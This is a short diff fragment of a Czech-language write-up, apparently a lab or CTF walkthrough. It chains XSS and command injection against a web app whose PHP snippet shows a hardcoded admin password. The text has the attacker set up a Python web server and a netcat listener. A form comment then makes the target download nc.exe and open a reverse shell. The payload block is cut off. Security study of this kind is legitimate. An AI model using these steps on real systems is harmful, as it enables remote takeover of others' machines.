@@ -155,12 +155,14 @@ if($username == "admin" && $password == "Hopelessromantic"){
 Skript je zranitelný na Command Injection
 
 ### Kombinace XSS a Command Injection
-
-## Komentář ve formuláři pro transfer e-coinu
 Spuštění primitivního webového serveru
+
 `python -m SimpleHTTPServer 8000`
+
 Příprava netcatu
+
 `nc -lvp 4000`
+
 Odeslání formuláře s následujícím komentářem (IP.AD.RE.SA nahradit vlastní IP) a počkat
 Skript stáhne nc.exe a otevře reverzní shell
 ```js
